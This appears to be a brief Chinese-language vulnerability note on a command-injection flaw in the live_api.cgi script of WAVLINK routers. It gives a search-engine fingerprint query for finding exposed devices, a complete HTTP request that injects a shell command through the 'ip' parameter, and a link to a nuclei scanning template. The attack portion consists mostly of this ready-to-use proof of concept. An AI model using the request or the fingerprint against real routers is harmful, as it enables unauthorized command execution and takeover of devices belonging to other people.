# WAVLINK live_api.cgi 存在命令执行

# 一、漏洞简介
WAVLINK wavlink是中国睿因科技（WAVLINK）公司的一款路由器。连接两个或多个网络的硬件设备，在网络间起网关的作用。WAVLINK 多款路由器 live_api.cgi 存在命令执行，攻击者可通过此漏洞获取权限。

# 二、影响版本
+ wavlink 路由器

# 三、资产测绘
+ hunter`web.body="firstFlage"`
+ 特征

![1703226837131-abc67852-1626-482a-982b-2f8f69837f2c.png](./img/eM5UpXtfHuIL8Dph/1703226837131-abc67852-1626-482a-982b-2f8f69837f2c-816220.png)

# 四、漏洞复现
```java
GET /cgi-bin/live_api.cgi?page=abc&id=173&ip=;id; HTTP/1.1
Host: {hostname}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

![1703226886159-a96b555d-7af9-4b07-84b0-7ab51ca44a69.png](./img/eM5UpXtfHuIL8Dph/1703226886159-a96b555d-7af9-4b07-84b0-7ab51ca44a69-201909.png)

nuclei脚本

[wanlink-router-live-api-cgi-rce.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/1622799/1709222231462-65f524b5-3aa2-4cd2-a4b3-8783722d7a12.yaml)



> 更新: 2024-02-29 23:57:11  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/on0bkn7zcvll4ivu>